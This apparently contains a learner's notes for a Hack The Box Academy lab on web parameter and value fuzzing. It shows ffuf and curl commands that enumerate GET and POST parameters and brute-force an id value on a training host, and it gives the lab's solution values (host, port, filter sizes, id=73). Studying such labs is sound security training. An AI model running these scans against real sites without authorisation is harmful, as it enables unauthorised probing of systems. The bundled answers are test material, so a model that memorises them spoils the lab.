### Parameter Fuzzing - GET

```
# If we run a recursive ffuf scan on admin.academy.htb, we should find http://admin.academy.htb:PORT/admin/admin.php. 
If we try accessing this page, we see the following:  "You don't have access to read the flag!"
```

### GET Request Fuzzing

```
# Similarly to how we have been fuzzing various parts of a website, we will use ffuf to enumerate parameters. 
# Let us first start with fuzzing for GET requests, which are usually passed right after the URL, with a ? symbol, like:

http://admin.academy.htb:PORT/admin/admin.php?param1=key.

# So, all we have to do is replace param1 in the example above with FUZZ and rerun our scan. 
# Before we can start, however, we must pick an appropriate wordlist. 
# Once again, SecLists has just that in /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt. 
# With that, we can run our scan.
# (Once again, we will get many results back, so we will filter out the default response size we are getting.)

ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
```

```
# We do get a hit back. Let us try to visit the page and add this GET parameter, and see whether we can read the flag now:
# http://admin.academy.htb:PORT/admin/admin.php?REDACTED=key
# "This method is depracated"
# As we can see, the only hit we got back has been deprecated and appears to be no longer in use.
```

### Task solution

```
94.237.59.30:44437

# First Check parameter wihout -fs do determine what default response size, next run command:

ffuf -w ./SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:44437/admin/admin.php?FUZZ=key -fs 798 
```

### Parameter Fuzzing - POST

```
# OST requests are passed in the data field within the HTTP request.
# To fuzz the data field with ffuf, we can use the -d flag, 
# as we saw previously in the output of ffuf -h. We also have to add -X POST to send POST requests.

# Tip: In PHP, "POST" data "content-type" can only accept "application/x-www-form-urlencoded". 
# So, we can set that in "ffuf" with "-H 'Content-Type: application/x-www-form-urlencoded'".

# So, let us repeat what we did earlier, but place our FUZZ keyword after the -d flag:

ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs <SIZE>
```

```
# As we can see this time, we got a couple of hits, the same one we got when fuzzing GET and another parameter, which is id. 
# Let's see what we get if we send a POST request with the id parameter. 
# We can do that with curl, as follows:

curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
```

### Value Fuzzing

```
# After fuzzing a working parameter, we now have to fuzz the correct value that would return the flag content we need. 
```

```
# When it comes to fuzzing parameter values, we may not always find a pre-made wordlist that would work for us, 
# as each parameter would expect a certain type of value.

# For some parameters, like usernames, we can find a pre-made wordlist for potential usernames, 
# or we may create our own based on users that may potentially be using the website. 

# For such cases, we can look for various wordlists under the seclists directory and 
# try to find one that may contain values matching the parameter we are targeting. 
# In other cases, like custom parameters, we may have to develop our own wordlist. 

# In this case, we can guess that the id parameter can accept a number input of some sort. 
# These ids can be in a custom format, or can be sequential, like from 1-1000 or 1-1000000, and so on. 
# We'll start with a wordlist containing all numbers from 1-1000.

# There are many ways to create this wordlist, from manually typing the IDs in a file, or scripting it using Bash or Python. 
# The simplest way is to use the following command in Bash that writes all numbers from 1-1000 to a file:

for i in $(seq 1 1000); do echo $i >> ids.txt; done
```

```
# Value Fuzzing
# Our command should be fairly similar to the POST command we used to fuzz for parameters, 
# but our FUZZ keyword should be put where the parameter value would be, 
# and we will use the ids.txt wordlist we just created, as follows:

ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php \
-X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx

# We see that we get a hit right away. We can finally send another POST request using curl, 
# as we did in the previous section, use the id value we just found, and collect the flag.
```

### Task solution

``
for i in $(seq 1 1000); do echo $i >> ids.txt; done

ffuf -w ./SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u http://admin.academy.htb:44437/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 798

ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:44437/admin/admin.php \
-X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768

curl http://admin.academy.htb:44437/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded'
```
